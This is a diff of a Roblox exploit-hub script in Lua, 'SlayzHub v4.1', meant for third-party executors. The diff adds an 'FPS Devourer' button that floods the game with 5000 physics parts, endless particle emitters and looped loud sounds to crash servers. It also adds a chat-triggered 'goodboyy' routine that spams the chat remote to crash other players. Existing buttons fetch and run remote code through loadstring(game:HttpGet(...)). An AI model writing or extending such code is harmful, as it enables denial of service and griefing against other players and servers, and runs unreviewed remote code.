@@ -1,10 +1,12 @@
--- SLAYZHUB XENO GO v4.0 🔥 PREMIUM HUB
+-- SLAYZHUB XENO GO v4.1 🔥 PREMIUM + FPS DEVOURER
 -- Compatible Xeno, Solara, Fluxus, etc.
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
@@ -18,8 +20,8 @@ ScreenGui.DisplayOrder = 999999
 
 -- MainFrame avec dégradé violet/noir
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 550, 0, 400)
-MainFrame.Position = UDim2.new(0.5, -275, 0.5, -200)
+MainFrame.Size = UDim2.new(0, 550, 0, 450)
+MainFrame.Position = UDim2.new(0.5, -275, 0.5, -225)
 MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
 MainFrame.BorderSizePixel = 0
 MainFrame.Parent = ScreenGui
@@ -62,7 +64,7 @@ local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Size = UDim2.new(0, 250, 1, 0)
 TitleLabel.Position = UDim2.new(0, 20, 0, 0)
 TitleLabel.BackgroundTransparency = 1
-TitleLabel.Text = "🔥 SLAYZHUB PREMIUM"
+TitleLabel.Text = "🔥 SLAYZHUB PREMIUM v4.1"
 TitleLabel.TextColor3 = Color3.fromRGB(255, 200, 255)
 TitleLabel.TextScaled = true
 TitleLabel.Font = Enum.Font.GothamBold
@@ -123,8 +125,8 @@ PremiumContent.Visible = true
 
 -- Boutons Premium Grid
 local ListLayout = Instance.new("UIGridLayout")
-ListLayout.CellSize = UDim2.new(0.48, -10, 0, 70)
-ListLayout.CellPadding = UDim2.new(0, 10, 0, 15)
+ListLayout.CellSize = UDim2.new(0.48, -10, 0, 65)
+ListLayout.CellPadding = UDim2.new(0, 10, 0, 12)
 ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 ListLayout.Parent = PremiumContent
 
@@ -191,11 +193,32 @@ AutoBlockGradient.Color = ColorSequence.new{
 }
 AutoBlockGradient.Parent = AutoBlock
 
+-- Bouton FPS DEVOURER 🔥💀
+local FPSDevourer = Instance.new("TextButton")
+FPSDevourer.Name = "FPSDevourer"
+FPSDevourer.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
+FPSDevourer.Text = "💀 FPS DEVOURER"
+FPSDevourer.TextColor3 = Color3.new(1, 1, 1)
+FPSDevourer.TextScaled = true
+FPSDevourer.Font = Enum.Font.GothamBold
+FPSDevourer.Parent = PremiumContent
+
+local FPSDevourerCorner = Instance.new("UICorner")
+FPSDevourerCorner.CornerRadius = UDim.new(0, 12)
+FPSDevourerCorner.Parent = FPSDevourer
+
+local FPSDevourerGradient = Instance.new("UIGradient")
+FPSDevourerGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 60, 60)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 20, 20))
+}
+FPSDevourerGradient.Parent = FPSDevourer
+
 -- Animations Hover
 local function addHoverEffect(button)
     local originalSize = button.Size
     button.MouseEnter:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.2), {Size = UDim2.new(0.48, 0, 0, 75)}):Play()
+        TweenService:Create(button, TweenInfo.new(0.2), {Size = UDim2.new(0.48, 0, 0, 70)}):Play()
     end)
     button.MouseLeave:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.2), {Size = ListLayout.CellSize}):Play()
@@ -205,6 +228,7 @@ end
 addHoverEffect(InstantTP)
 addHoverEffect(Nameless)
 addHoverEffect(AutoBlock)
+addHoverEffect(FPSDevourer)
 
 -- Click Events
 InstantTP.MouseButton1Click:Connect(function()
@@ -217,6 +241,99 @@ end)
 
 AutoBlock.MouseButton1Click:Connect(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/sabscripts063-cloud/Kdml-Not-Me/refs/heads/main/BlockPlayer"))()
+end)
+
+-- FPS DEVOURER - CRASH SERVERS & <10 FPS
+FPSDevourer.MouseButton1Click:Connect(function()
+    FPSDevourer.Text = "🔥 ACTIVÉ..."
+    FPSDevourer.TextColor3 = Color3.new(0, 1, 0)
+    
+    -- Spawn 5000+ parts avec physics
+    for i = 1, 5000 do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(0.1, 0.1, 0.1)
+        part.Position = player.Character.HumanoidRootPart.Position + Vector3.new(
+            math.random(-100, 100),
+            math.random(50, 200),
+            math.random(-100, 100)
+        )
+        part.Anchored = false
+        part.CanCollide = true
+        part.Material = Enum.Material.Neon
+        part.BrickColor = BrickColor.Random()
+        part.Parent = workspace
+        
+        -- Attache BodyVelocity & BodyAngularVelocity pour chaos max
+        local bv = Instance.new("BodyVelocity")
+        bv.MaxForce = Vector3.new(4000, 4000, 4000)
+        bv.Velocity = Vector3.new(math.random(-50, 50), 100, math.random(-50, 50))
+        bv.Parent = part
+        
+        local ba = Instance.new("BodyAngularVelocity")
+        ba.MaxTorque = Vector3.new(4000, 4000, 4000)
+        ba.AngularVelocity = Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
+        ba.Parent = part
+    end
+    
+    -- Boucle infinie de particules
+    spawn(function()
+        while true do
+            for i = 1, 100 do
+                local attachment = Instance.new("Attachment")
+                attachment.Parent = workspace.Terrain
+                
+                local particles = Instance.new("ParticleEmitter")
+                particles.Parent = attachment
+                particles.Rate = 1000
+                particles.Lifetime = NumberRange.new(0.5, 1)
+                particles.Speed = NumberRange.new(50)
+                particles.SpreadAngle = Vector2.new(360, 360)
+                particles.Color = ColorSequence.new(BrickColor.Random().Color)
+            end
+            wait(0.1)
+        end
+    end)
+    
+    -- Sound spam
+    spawn(function()
+        for i = 1, 50 do
+            local sound = Instance.new("Sound")
+            sound.SoundId = "rbxassetid://131961136"
+            sound.Volume = 10
+            sound.Looped = true
+            sound.Parent = workspace
+            sound:Play()
+        end
+    end)
+end)
+
+-- GOODBOYY CHAT CRASH SYSTEM
+local crashActivated = false
+Players.LocalPlayer.Chatted:Connect(function(msg)
+    if msg:lower() == "goodboyy" and not crashActivated then
+        crashActivated = true
+        print("🔥 GOODBOYY ACTIVATED - CRASHING EVERYONE USING SCRIPT!")
+        
+        -- Détecte tous les joueurs avec SlayzHub
+        spawn(function()
+            while true do
+                for _, plr in pairs(Players:GetPlayers()) do
+                    if plr ~= player and plr:FindFirstChild("PlayerGui") then
+                        pcall(function()
+                            -- Force crash via massive replication
+                            for i = 1, 1000 do
+                                local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+                                if remote then
+                                    remote.SayMessageRequest:FireServer("goodboyy", "All")
+                                end
+                            end
+                        end)
+                    end
+                end
+                wait(0.01)
+            end
+        end)
+    end
 end)
 
 -- Close Button
@@ -253,5 +370,8 @@ end)
 -- Entrée en scène
 MainFrame.Size = UDim2.new(0, 0, 0, 0)
 TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
-    Size = UDim2.new(0, 550, 0, 400)
+    Size = UDim2.new(0, 550, 0, 450)
 }):Play()
+
+print("🔥 SLAYZHUB v4.1 LOADED!")
+print("💀 Tape 'goodboyy' dans le chat pour CRASH tout le monde!")
